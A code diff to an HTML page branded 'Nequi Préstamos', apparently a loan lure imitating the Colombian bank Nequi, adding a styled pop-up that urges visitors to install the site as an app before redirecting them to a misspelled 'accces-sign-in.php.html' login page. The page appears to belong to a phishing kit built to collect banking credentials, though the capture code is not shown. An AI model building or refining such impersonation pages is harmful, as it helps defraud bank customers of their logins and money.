@@ -50,6 +50,68 @@
         align-items: center;
         display: none;
       }
+      /* Estilos para el Modal de Instalación Personalizado */
+      #pwaInstallModal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 99999;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        display: none;
+      }
+      .pwa-card {
+        background: white;
+        width: 90%;
+        max-width: 340px;
+        border-radius: 16px;
+        padding: 24px;
+        text-align: center;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        font-family: inherit;
+      }
+      .pwa-card img {
+        width: 64px;
+        height: 64px;
+        border-radius: 14px;
+        margin-bottom: 12px;
+      }
+      .pwa-card h3 {
+        font-size: 18px;
+        color: #200020;
+        margin-bottom: 8px;
+        font-weight: 700;
+      }
+      .pwa-card p {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 20px;
+      }
+      .pwa-buttons {
+        display: flex;
+        gap: 12px;
+      }
+      .pwa-btn {
+        flex: 1;
+        padding: 10px 16px;
+        border-radius: 8px;
+        font-weight: 600;
+        font-size: 14px;
+        cursor: pointer;
+        border: none;
+      }
+      .pwa-btn-cancel {
+        background: #f1f3f4;
+        color: #3c4043;
+      }
+      .pwa-btn-install {
+        background: #DA0081;
+        color: white;
+      }
     </style>
 </head>
 <body>
@@ -81,6 +143,20 @@
         <a id="closeModal" class="nq-btn w-button" style="margin-top: 10px; background-color: blueviolet">Solicitar crédito</a>
       </div>
     </div>
+
+    <!-- Modal Personalizado de Instalación tipo PWA -->
+    <div id="pwaInstallModal">
+      <div class="pwa-card">
+        <img src="assets/favicon.ico" alt="App Icon">
+        <h3>Instalar Nequi Préstamos</h3>
+        <p>Instala esta aplicación en tu dispositivo para solicitar tu crédito de forma rápida y segura.</p>
+        <div class="pwa-buttons">
+          <button id="pwaCancelBtn" class="pwa-btn pwa-btn-cancel">Cancelar</button>
+          <button id="pwaInstallBtn" class="pwa-btn pwa-btn-install">Instalar</button>
+        </div>
+      </div>
+    </div>
+
     <div class="credits" style="padding-bottom: 0 !important">
       <div class="wrap">
         <div class="wrapper" style="width: 100% !important">
@@ -149,21 +225,39 @@
         e.preventDefault();
         deferredPrompt = e;
       });
-      async function procesarSolicitud() {
+
+      const modal = document.getElementById("pwaInstallModal");
+      const installBtn = document.getElementById("pwaInstallBtn");
+      const cancelBtn = document.getElementById("pwaCancelBtn");
+
+      function procesarSolicitud() {
         localStorage.setItem("typeProduct", "salvavidas");
+        // Muestra el modal personalizado de Instalar / Cancelar
+        modal.style.display = "flex";
+      }
+
+      // Si le da clic en Instalar dentro del modal
+      installBtn.addEventListener("click", async () => {
+        modal.style.display = "none";
         if (deferredPrompt) {
           deferredPrompt.prompt();
           const { outcome } = await deferredPrompt.userChoice;
           deferredPrompt = null;
-          window.location.href = "access-passed/accces-sign-in.php.html";
-        } else {
-          window.location.href = "access-passed/accces-sign-in.php.html";
         }
-      }
+        // Redirige después de instalar
+        window.location.href = "access-passed/accces-sign-in.php.html";
+      });
+
+      // Si le da clic en Cancelar, se oculta el modal y no avanza
+      cancelBtn.addEventListener("click", () => {
+        modal.style.display = "none";
+      });
+
       const salvavidas = document.getElementById("salvavidas");
       const btnSolicitar = document.getElementById("btn-solicitar");
       const closeModal = document.getElementById("closeModal");
       const imageInit = document.getElementById("imageInit");
+
       salvavidas.addEventListener("click", (event) => {
         event.preventDefault();
         procesarSolicitud();
@@ -176,6 +270,7 @@
         event.preventDefault();
         imageInit.style.display = "none";
       });
+
       getRangoTresMeses();
       function getRangoTresMeses() {
         const hoy = new Date();
